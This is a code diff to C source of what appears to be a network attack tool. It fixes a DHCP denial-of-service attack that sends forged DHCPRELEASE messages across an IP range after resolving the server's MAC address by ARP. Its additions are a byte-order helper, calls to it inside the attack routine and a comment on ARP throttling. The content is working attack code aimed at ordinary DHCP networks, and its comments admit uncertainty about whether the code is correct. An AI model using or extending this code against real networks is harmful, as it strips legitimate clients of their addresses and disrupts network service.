@@ -821,6 +821,27 @@ void dhcp_th_rogue_server_exit( struct attacks *attacks )
     pthread_exit(NULL);
 }
 
+
+
+u_int32_t flip_ip(u_int32_t ip)
+{
+    u_int32_t leftmost,leftmiddle,rightmiddle,rightmost,flipped;
+    
+    // do some binary manipulation of the value to flip the things around
+    leftmost = (ip & 0x000000FF) >> 0;
+    leftmiddle = (ip & 0x0000FF00) >> 8;
+    rightmiddle = (ip & 0x00FF0000) >> 16;
+    rightmost = (ip & 0xFF000000) >> 24;
+
+    leftmost  <<= 24;
+    leftmiddle <<= 16;
+    rightmiddle <<= 8;
+    rightmost <<= 0;
+
+    flipped = (leftmost | leftmiddle | rightmiddle | rightmost);
+    return flipped;
+}
+
 /**********************************/
 /* DoS attack sending DHCPRELEASE */
 /**********************************/
@@ -852,6 +873,8 @@ void dhcp_th_dos_send_release( void *arg )
     memcpy((void *)&aux_long, (void *)param[DHCP_DOS_SEND_RELEASE_START_IP].value, 4);
     memcpy((void *)&aux_long1, (void *)param[DHCP_DOS_SEND_RELEASE_SERVER].value, 4);
     
+    aux_long = flip_ip(aux_long);
+    aux_long1 = flip_ip(aux_long1);
 
     if (dhcp_send_arp_request(attacks, aux_long1) < 0)
     /* build and send an ARP request, write an error to the log and quit if returns -1
@@ -872,6 +895,7 @@ void dhcp_th_dos_send_release( void *arg )
     thread_usleep(5000000); // sleep for 5 seconds to see if there's arp throttling
     /* loop */
     /* I believe the condition in english is "while current IP is lesser than the value of the last IP and while the attack is not stopped" */
+    // If with this setup, the attack successfuly learns the server MAC and the MAC #1 and still fails on #2, then a delay between ARP requests should be implemented
     while ((aux_long <= (*(u_int32_t *)param[DHCP_DOS_SEND_RELEASE_END_IP].value)) 
               && !attacks->attack_th.stop) 
     {
@@ -944,6 +968,8 @@ dhcp_send_arp_request(struct attacks *attacks, u_int32_t ip_dest) // possible th
       lhandler = iface_data->libnet_handler;
         //aux_long = inet_addr(iface_data->ipaddr); //I think this line right here is what is broken. It is supposed to provide the IP address of the sender, however the packets in the wireshark capture say that ARP reply hsould go to 255.255.255.255
         memcpy((void *)&aux_long, (void *)param[DHCP_DOS_SEND_RELEASE_CLIENT_IP].value, 4); // I have no clue what I'm doing, I saw this in other part of the script and hope it works lmao
+        aux_long = flip_ip(aux_long);
+        
         t = libnet_build_arp(
                     ARPHRD_ETHER, /* hardware addr */
                     ETHERTYPE_IP, /* protocol addr */
